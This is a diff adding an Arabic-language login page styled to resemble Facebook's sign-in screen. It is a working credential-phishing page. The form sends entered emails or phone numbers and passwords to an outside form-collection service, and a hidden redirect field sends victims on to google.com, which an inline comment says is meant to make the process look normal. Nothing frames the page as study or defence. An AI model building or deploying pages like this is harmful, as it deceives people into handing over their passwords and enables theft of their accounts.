@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        /* تنسيق الصفحة لتكون في المنتصف */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        /* تنسيق بطاقة تسجيل الدخول */
+        .login-card {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 380px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #1c1e21;
+            margin-bottom: 25px;
+            font-size: 24px;
+        }
+
+        /* تنسيق الخانات (Inputs) */
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0866ff;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        /* تنسيق الزر */
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0866ff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 19px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #0055d4;
+        }
+
+        /* الروابط السفلية */
+        .footer {
+            text-align: center;
+            font-size: 14px;
+            color: #65676b;
+            margin-top: 20px;
+            border-top: 1px solid #dddfe2;
+            padding-top: 20px;
+        }
+
+        .footer a {
+            color: #0866ff;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <h2>تسجيل الدخول</h2>
+
+        <!-- رابط Formspark الخاص بك مدمج هنا -->
+        <form action="https://submit-form.com" method="POST">
+            
+            <!-- حقل البريد الإلكتروني -->
+            <input type="email" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+            
+            <!-- حقل كلمة المرور -->
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+
+            <!-- توجيه المستخدم لموقع جوجل بعد الإرسال لتبدو العملية طبيعية -->
+            <input type="hidden" name="_redirect" value="https://google.com" />
+
+            <!-- زر تسجيل الدخول -->
+            <button type="submit">تسجيل دخول</button>
+        </form>
+
+        <div class="footer">
+            <a href="#">نسيت كلمة السر؟</a> · <a href="#">إنشاء حساب جديد</a>
+        </div>
+    </div>
+
+</body>
+</html>
